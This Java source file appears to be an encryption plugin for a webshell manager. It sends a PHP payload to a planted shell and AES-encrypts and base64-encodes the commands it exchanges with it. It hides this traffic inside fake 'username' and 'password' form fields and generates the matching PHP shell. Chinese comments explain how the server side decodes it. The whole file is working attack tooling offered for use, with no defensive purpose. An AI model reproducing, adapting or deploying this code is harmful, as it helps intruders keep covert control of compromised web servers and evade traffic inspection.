package shells.cryptions.phpXor;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import util.Log;
import util.functions;
import util.http.Http;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.net.URLEncoder;

@CryptionAnnotation(
        Name="PHP_AES_BASE64",
        payloadName = "PhpDynamicPayload"
)

public class MyPHPShell implements Cryption {
    private ShellEntity shell;
    private Http http;
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private String key;
    private boolean state;
    private byte[] payload;
    private String findStrLeft;
    private String pass;
    private String findStrRight;
    private String evalContent;
    @Override
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX();
        this.pass = this.shell.getPassword();

        try {
            this.encodeCipher = Cipher.getInstance("AES");
            this.decodeCipher = Cipher.getInstance("AES");
            // this.key="functions.md5("key").substring(0, 16)
            this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception var4) {
            Log.error((Throwable)var4);
        }
    }

    @Override
    public byte[] encode(byte[] data) {
        try{
            String crptoString=java.util.Base64.getEncoder().encodeToString(this.encodeCipher.doFinal(data));
            //这边一定要编码,对于php来说是个坑,php那边服务端不需要再url解码,直接base解码aes解密即可
            return ("username="+this.pass+"&password="+(URLEncoder.encode(crptoString))).getBytes();
        }catch (Exception e){
            Log.error(e);
            return null;
        }
    }

    @Override
    public byte[] decode(byte[] data) {
        try {
            //解码再解密
            data = functions.base64Decode((new String(data)));
            return this.decodeCipher.doFinal(data);
        } catch (Exception var3) {
            Log.error((Throwable)var3);
            return null;
        }
    }
    public boolean isSendRLData() {
        return true;
    }

    public boolean check() {
        return this.state;
    }
    @Override
    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateMyPHPShell(password,"password", secretKey);
   }

}